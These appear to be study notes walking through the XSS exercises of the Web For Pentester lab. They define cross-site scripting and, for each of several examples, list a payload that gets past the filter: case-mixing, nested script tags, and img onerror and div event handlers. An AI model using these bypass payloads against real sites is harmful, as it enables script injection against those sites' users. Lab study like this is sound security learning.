## Cross Site Scripting (XSS) 
``` Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. ```


### Web For Pentester ( XSS ) Walkthrough
### Example 1
``` There is no input validation, so, can exploit it directly with the classic “alert(1)” injection. ```
### Payload - <script>alert(1)</script>

### Example 2
``` Filtered <script> and </script> with preg_replace function ```
### Payload - <sCript>alert(1)</sCript> and <scr<script>ipt>alert(1)</scr</script>ipt>
  
### Example 3
``` Use PCRE modifier “i” (PCRE_CASELESS) to match both upper and lower case letters. However, recursion method still works fine. ```
### Payload - <scr<script>ipt>alert(1)</scr</script>ipt>
  
  
### Example 4 
``` The script will stop when “script” is detected, Need other event without script ```
### Payload - <img src="xxxx" onerror="alert(1)">  and <div onmousemove="alert(1)" src="xxxx"> , etc...
  
### Exmple 5
``` ```
### Payload - 


